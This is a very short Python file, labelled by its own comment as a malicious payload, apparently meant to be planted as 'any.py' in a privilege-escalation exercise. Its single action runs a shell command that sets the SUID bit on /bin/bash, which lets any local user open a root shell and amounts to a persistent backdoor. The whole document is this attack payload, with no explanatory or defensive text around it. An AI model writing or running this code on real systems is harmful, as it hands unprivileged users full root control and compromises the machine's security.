# any.py (malicious payload)
import os
os.system("chmod +s /bin/bash")  # Make bash SUID root
